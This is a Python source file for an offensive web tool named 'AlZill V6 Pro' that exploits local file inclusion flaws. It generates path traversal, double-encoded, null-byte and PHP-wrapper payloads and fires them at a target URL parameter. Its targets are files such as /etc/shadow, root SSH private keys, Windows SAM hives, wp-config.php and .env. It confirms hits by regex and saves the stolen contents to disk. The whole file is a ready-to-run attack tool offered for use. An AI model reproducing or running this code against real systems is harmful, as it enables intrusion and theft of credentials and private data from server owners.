#!/usr/bin/env python3
"""
LFI Exploit Module - AlZill V6 Pro
Advanced Local File Inclusion exploitation with multiple bypass techniques
Features: Path traversal variants | Null byte injection | Double encoding | Multi-OS support
"""

import requests
import urllib3
import base64
import re
import time
from termcolor import cprint
from urllib.parse import urlparse, urlunparse, parse_qs, urlencode, quote, unquote
from typing import List, Dict, Optional, Tuple

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

INFO = "cyan"
SUCCESS = "green"
WARNING = "yellow"
ERROR = "red"
HIGHLIGHT = "magenta"


class LFIExploiter:
    def __init__(self, verbose: bool = False):
        self.verbose = verbose
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # ============================================================
        # LINUX SENSITIVE FILES
        # ============================================================
        self.linux_files = [
            # Basic system files
            '/etc/passwd',
            '/etc/shadow',
            '/etc/group',
            '/etc/hosts',
            '/etc/hostname',
            '/etc/issue',
            '/etc/os-release',
            '/etc/debian_version',
            '/etc/redhat-release',
            '/etc/lsb-release',
            
            # Process information
            '/proc/self/environ',
            '/proc/self/cmdline',
            '/proc/self/status',
            '/proc/self/mounts',
            '/proc/self/fd/0',
            '/proc/self/fd/1',
            '/proc/self/fd/2',
            '/proc/self/fd/3',
            '/proc/self/fd/4',
            '/proc/self/fd/5',
            
            # Log files
            '/var/log/apache2/access.log',
            '/var/log/apache2/error.log',
            '/var/log/nginx/access.log',
            '/var/log/nginx/error.log',
            '/var/log/auth.log',
            '/var/log/syslog',
            '/var/log/messages',
            
            # SSH keys
            '/root/.ssh/id_rsa',
            '/root/.ssh/id_dsa',
            '/root/.ssh/authorized_keys',
            '/home/*/.ssh/id_rsa',
            '/home/*/.ssh/authorized_keys',
            
            # Config files
            '/etc/ssh/sshd_config',
            '/etc/mysql/my.cnf',
            '/etc/nginx/nginx.conf',
            '/etc/apache2/apache2.conf',
            '/etc/php.ini',
            '/etc/php/php.ini',
            
            # Source code
            'index.php',
            'config.php',
            'db.php',
            'wp-config.php',
            '.env',
        ]
        
        # ============================================================
        # WINDOWS SENSITIVE FILES
        # ============================================================
        self.windows_files = [
            'C:\\Windows\\win.ini',
            'C:\\Windows\\system.ini',
            'C:\\Windows\\System32\\drivers\\etc\\hosts',
            'C:\\Windows\\System32\\config\\SAM',
            'C:\\Windows\\System32\\config\\SYSTEM',
            'C:\\boot.ini',
            'C:\\Windows\\repair\\SAM',
            'C:\\Windows\\repair\\SYSTEM',
            'C:\\xampp\\apache\\conf\\httpd.conf',
            'C:\\xampp\\php\\php.ini',
            'C:\\xampp\\mysql\\bin\\my.ini',
            'C:\\inetpub\\wwwroot\\web.config',
            'C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config',
        ]
        
        # ============================================================
        # PHP WRAPPERS (LFI to RCE)
        # ============================================================
        self.php_wrappers = [
            'php://filter/convert.base64-encode/resource={file}',
            'php://filter/read=convert.base64-encode/resource={file}',
            'php://filter/zlib.deflate/convert.base64-encode/resource={file}',
            'php://filter/string.rot13/resource={file}',
            'php://filter/convert.iconv.utf-8.utf-16/resource={file}',
            'php://filter/convert.base64-encode|convert.base64-encode/resource={file}',
        ]
        
        # ============================================================
        # PATH TRAVERSAL VARIANTS
        # ============================================================
        self.traversal_variants = [
            # Basic traversal
            '../../../../../../../../../../',
            '../../../',
            '../../',
            '../',
            
            # Double dot variants
            '....//',
            '....//....//',
            '....//....//....//',
            
            # URL encoded
            '%2e%2e%2f',
            '%2e%2e/',
            '..%2f',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2f',
            
            # Double URL encoded
            '%252e%252e%252f',
            '%252e%252e/',
            '..%252f',
            
            # Unicode encoded
            '%c0%ae%c0%ae%c0%af',
            '%uff0e%uff0e%uff0f',
            
            # Mixed slashes
            '..\\',
            '..\\..\\',
            '..\\..\\..\\',
            
            # Path truncation (for extension bypass)
            '..........................',
            '....//....//....//....//....//',
        ]
        
        # ============================================================
        # NULL BYTE & FILTER BYPASS
        # ============================================================
        self.null_byte_variants = [
            '%00',
            '%2500',
            '\\x00',
            '.jpg%00',
            '.gif%00',
            '.png%00',
            '.txt%00',
            '%00.php',
            '%00.jpg',
        ]
        
        # ============================================================
        # SUCCESS INDICATORS
        # ============================================================
        self.success_indicators = {
            'linux': [
                r'root:x:[0-9]+:[0-9]+:',      # /etc/passwd
                r'daemon:x:[0-9]+:[0-9]+:',    # /etc/passwd
                r'^[a-z_]+:x?:[0-9]+:[0-9]+:', # Generic user entry
                r'USER=', r'HOME=', r'PATH=',  # Environment variables
                r'Apache', r'nginx',           # Server logs
                r'-----BEGIN RSA PRIVATE KEY-----',  # SSH keys
                r'DB_PASSWORD', r'DB_USER',    # Config files
            ],
            'windows': [
                r'\[extensions\]',              # win.ini
                r'\[fonts\]',                   # win.ini
                r'boot loader',                 # boot.ini
                r'operating systems',           # boot.ini
                r'C:\\Windows\\',               # Windows path
                r'Microsoft',                   # Microsoft products
            ],
            'php': [
                r'<\?php',
                r'<\?=',
                r'PD9waHA',                    # Base64 encoded <?php
                r'define\(', r'function ',
                r'\$db_', r'\$config',
            ],
            'base64': [
                r'^[A-Za-z0-9+/]{40,}={0,2}$',  # Base64 pattern
            ]
        }

    # ============================================================
    # PAYLOAD GENERATION
    # ============================================================
    
    def _generate_payloads(self, target_file: str) -> List[str]:
        """Generate all possible LFI payload variants"""
        payloads = []
        
        # 1. Basic path traversal
        for traversal in self.traversal_variants:
            payloads.append(f"{traversal}{target_file}")
        
        # 2. Null byte injection
        for traversal in self.traversal_variants[:5]:
            for null_byte in self.null_byte_variants:
                payloads.append(f"{traversal}{target_file}{null_byte}")
        
        # 3. PHP wrappers
        for wrapper in self.php_wrappers:
            payloads.append(wrapper.format(file=target_file))
            for traversal in self.traversal_variants[:3]:
                payloads.append(wrapper.format(file=f"{traversal}{target_file}"))
        
        # 4. Double encoding
        for payload in payloads[:20]:
            payloads.append(quote(payload))
            payloads.append(quote(quote(payload)))
        
        return list(set(payloads))  # Remove duplicates

    # ============================================================
    # URL BUILDING (محسن)
    # ============================================================
    
    def _build_test_url(self, url: str, param: str, payload: str) -> str:
        """Build test URL with payload injection"""
        parsed = urlparse(url)
        
        if parsed.query:
            params = parse_qs(parsed.query)
            params[param] = [payload]
            new_query = urlencode(params, doseq=True)
            return urlunparse(parsed._replace(query=new_query))
        else:
            # Add parameter to URL
            separator = '&' if '?' in url else '?'
            return f"{url}{separator}{param}={quote(payload)}"

    # ============================================================
    # RESPONSE ANALYSIS
    # ============================================================
    
    def _analyze_response(self, response_text: str) -> Tuple[bool, str, str]:
        """Analyze response for successful LFI"""
        # Check Linux indicators
        for indicator in self.success_indicators['linux']:
            match = re.search(indicator, response_text, re.IGNORECASE)
            if match:
                return True, 'linux', match.group(0)
        
        # Check Windows indicators
        for indicator in self.success_indicators['windows']:
            match = re.search(indicator, response_text, re.IGNORECASE)
            if match:
                return True, 'windows', match.group(0)
        
        # Check PHP indicators
        for indicator in self.success_indicators['php']:
            match = re.search(indicator, response_text, re.IGNORECASE)
            if match:
                return True, 'php', match.group(0)
        
        # Check Base64 indicators
        for indicator in self.success_indicators['base64']:
            match = re.search(indicator, response_text, re.IGNORECASE)
            if match:
                # Try to decode base64
                try:
                    decoded = base64.b64decode(match.group(0)).decode('utf-8', errors='ignore')
                    if '<?php' in decoded or 'root:x:' in decoded:
                        return True, 'base64', decoded[:100]
                except:
                    pass
        
        return False, None, None

    # ============================================================
    # FILE EXTRACTION
    # ============================================================
    
    def _extract_file_content(self, url: str, param: str, payload: str) -> Optional[str]:
        """Attempt to extract file content"""
        test_url = self._build_test_url(url, param, payload)
        
        try:
            response = self.session.get(test_url, timeout=10, verify=False)
            
            success, file_type, evidence = self._analyze_response(response.text)
            if success:
                return {
                    'url': test_url,
                    'type': file_type,
                    'evidence': evidence,
                    'content': response.text[:2000]  # First 2000 chars
                }
        except Exception as e:
            if self.verbose:
                cprint(f"    Error: {e}", WARNING)
        
        return None

    # ============================================================
    # MAIN EXPLOIT FUNCTION
    # ============================================================
    
    def exploit(self, url: str, param: str = None, verbose: bool = False) -> Dict:
        """Main LFI exploitation function"""
        self.verbose = verbose
        
        cprint("\n" + "="*70, HIGHLIGHT)
        cprint("[LFI EXPLOIT] AlZill V6 Pro - Advanced Local File Inclusion", HIGHLIGHT, attrs=['bold'])
        cprint("="*70, HIGHLIGHT)
        cprint(f"[*] Target: {url}", INFO)
        cprint("[*] Techniques: Path Traversal | Null Byte | Double Encoding | PHP Wrappers", "yellow")
        cprint("[*] Targets: Linux | Windows | PHP Source | Config Files", "yellow")
        
        # Detect parameter if not provided
        if not param:
            param = self._detect_parameter(url)
            if not param:
                cprint("[!] No parameter detected. Using common LFI parameters...", WARNING)
                param = 'file'
        
        cprint(f"[*] Testing parameter: {param}", INFO)
        
        results = {
            'url': url,
            'parameter': param,
            'success': False,
            'files': [],
            'payloads': []
        }
        
        # ============================================================
        # TEST LINUX FILES
        # ============================================================
        cprint("\n[1] 🐧 Testing Linux files...", INFO)
        
        for target_file in self.linux_files[:20]:  # Limit for speed
            payloads = self._generate_payloads(target_file)
            
            for payload in payloads[:30]:  # Limit per file
                if self.verbose:
                    cprint(f"    Testing: {target_file[:30]}...", INFO)
                
                result = self._extract_file_content(url, param, payload)
                if result:
                    results['success'] = True
                    results['files'].append({
                        'file': target_file,
                        'type': result['type'],
                        'evidence': result['evidence'][:100],
                        'url': result['url']
                    })
                    results['payloads'].append(payload[:100])
                    
                    cprint(f"\n    ✅ SUCCESS! Extracted: {target_file}", SUCCESS)
                    cprint(f"       Evidence: {result['evidence'][:80]}", "cyan")
                    
                    # Save extracted content
                    self._save_extracted_file(target_file, result['content'])
                    
                    if not self.verbose:
                        break  # Stop after first success in non-verbose mode
        
        # ============================================================
        # TEST WINDOWS FILES
        # ============================================================
        cprint("\n[2] 🪟 Testing Windows files...", INFO)
        
        for target_file in self.windows_files[:10]:
            payloads = self._generate_payloads(target_file)
            
            for payload in payloads[:20]:
                if self.verbose:
                    cprint(f"    Testing: {target_file[:30]}...", INFO)
                
                result = self._extract_file_content(url, param, payload)
                if result:
                    results['success'] = True
                    results['files'].append({
                        'file': target_file,
                        'type': result['type'],
                        'evidence': result['evidence'][:100],
                        'url': result['url']
                    })
                    results['payloads'].append(payload[:100])
                    
                    cprint(f"\n    ✅ SUCCESS! Extracted: {target_file}", SUCCESS)
                    cprint(f"       Evidence: {result['evidence'][:80]}", "cyan")
                    
                    self._save_extracted_file(target_file, result['content'])
                    
                    if not self.verbose:
                        break
        
        # ============================================================
        # DISPLAY SUMMARY
        # ============================================================
        self._display_results(results)
        
        return results

    def _detect_parameter(self, url: str) -> Optional[str]:
        """Automatically detect LFI parameter"""
        common_params = [
            'file', 'page', 'path', 'include', 'src', 'doc', 'lang',
            'view', 'config', 'template', 'theme', 'content', 'action',
            'load', 'read', 'data', 'folder', 'site', 'book', 'cat',
            'category', 'id', 'post', 'article', 'news', 'download',
            'filename', 'dir', 'directory', 'document'
        ]
        
        parsed = urlparse(url)
        if parsed.query:
            params = parse_qs(parsed.query)
            for param in params.keys():
                if param.lower() in common_params:
                    return param
        
        return None

    def _save_extracted_file(self, filename: str, content: str):
        """Save extracted file content"""
        import os
        from datetime import datetime
        
        os.makedirs("lfi_extracted", exist_ok=True)
        
        safe_name = filename.replace('/', '_').replace('\\', '_').replace(':', '_')
        save_path = f"lfi_extracted/{safe_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        with open(save_path, 'w', encoding='utf-8') as f:
            f.write(f"Source: {filename}\n")
            f.write(f"Timestamp: {datetime.now().isoformat()}\n")
            f.write("="*60 + "\n\n")
            f.write(content)
        
        cprint(f"       Saved to: {save_path}", SUCCESS)

    def _display_results(self, results: Dict):
        """Display final results"""
        cprint("\n" + "="*70, HIGHLIGHT)
        cprint("📊 LFI EXPLOIT RESULTS", HIGHLIGHT, attrs=['bold'])
        cprint("="*70, HIGHLIGHT)
        
        if results['success']:
            cprint(f"\n[!!!] LFI VULNERABILITY CONFIRMED!", ERROR, attrs=['bold'])
            cprint(f"[+] Parameter: {results['parameter']}", SUCCESS)
            cprint(f"[+] Files extracted: {len(results['files'])}", SUCCESS)
            
            for file_info in results['files'][:10]:
                cprint(f"\n    📁 File: {file_info['file']}", INFO)
                cprint(f"       Type: {file_info['type']}", "cyan")
                cprint(f"       Evidence: {file_info['evidence']}", "yellow")
                cprint(f"       URL: {file_info['url'][:80]}...", INFO)
            
            if len(results['files']) > 10:
                cprint(f"\n    ... and {len(results['files']) - 10} more files", INFO)
        else:
            cprint(f"\n[✓] No LFI vulnerabilities found", SUCCESS)
            cprint(f"    All payloads tested with multiple bypass techniques", INFO)
        
        cprint("\n" + "="*70 + "\n", HIGHLIGHT)


# ============================================================
# LEGACY FUNCTIONS
# ============================================================

def exploit(url: str, param: str = None, mode: str = None, verbose: bool = False) -> Dict:
    """
    Legacy exploit function with backward compatibility
    
    Args:
        url: Target URL
        param: Parameter name (auto-detected if None)
        mode: Ignored (kept for compatibility)
        verbose: Show detailed output
    """
    exploiter = LFIExploiter(verbose=verbose)
    return exploiter.exploit(url, param=param, verbose=verbose)


def exploit_with_param(url: str, param: str, verbose: bool = False) -> Dict:
    """Exploit with specific parameter"""
    return exploit(url, param=param, verbose=verbose)


if __name__ == "__main__":
    import sys
    
    if len(sys.argv) > 1:
        target = sys.argv[1]
        param = sys.argv[2] if len(sys.argv) > 2 else None
        verbose = "--verbose" in sys.argv or "-v" in sys.argv
        
        exploit(target, param=param, verbose=verbose)
    else:
        print("Usage: python exploit_lfi.py <target_url> [parameter] [--verbose]")
        print("Examples:")
        print("  python exploit_lfi.py 'https://example.com/page?file=index'")
        print("  python exploit_lfi.py 'https://example.com/page?file=index' file")
        print("  python exploit_lfi.py 'https://example.com/page?file=index' --verbose")